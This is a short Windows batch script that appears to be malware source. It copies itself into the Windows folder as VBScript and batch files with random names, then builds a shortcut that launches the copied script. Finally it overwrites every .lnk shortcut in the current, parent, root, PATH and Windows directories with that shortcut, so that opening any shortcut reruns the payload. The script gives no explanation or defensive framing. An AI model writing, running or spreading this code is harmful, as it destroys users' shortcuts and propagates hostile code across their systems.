copy y.bat %windir%\dropa.vbs
copy y.bat %windir%\mzxfv.bat
copy y.bat %windir%\dropb.vbs
echo.on error resume next >%windir%\dropb.vbs
echo dim wshs >>%windir%\dropb.vbs
echo set wshs=wscript.createobject("wscript.shell") >>%windir%\dropb.vbs
echo wshs.run "%windir%\mzxfv.bat" >>%windir%\dropb.vbs
echo dim wshs, msc > %windir%\dropa.vbs
echo set wshs=Wscript.CreateObject("WScript.Shell") >> %windir%\dropa.vbs
echo set msc=wshs.CreateShortcut("C:\vbs.lnk") >> %windir%\dropa.vbs
echo msc.TargetPath = wshs.ExpandEnvironmentStrings("%windir%\dropb.vbs ") >> %windir%\dropa.vbs
echo msc.WindowStyle = 4 >> %windir%\dropa.vbs
echo msc.Save >> %windir%\dropa.vbs
cscript %windir%\dropa.vbs
del %windir%\dropa.vbs
for %%k in (*.lnk \*.lnk ..\*.lnk %path%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%k
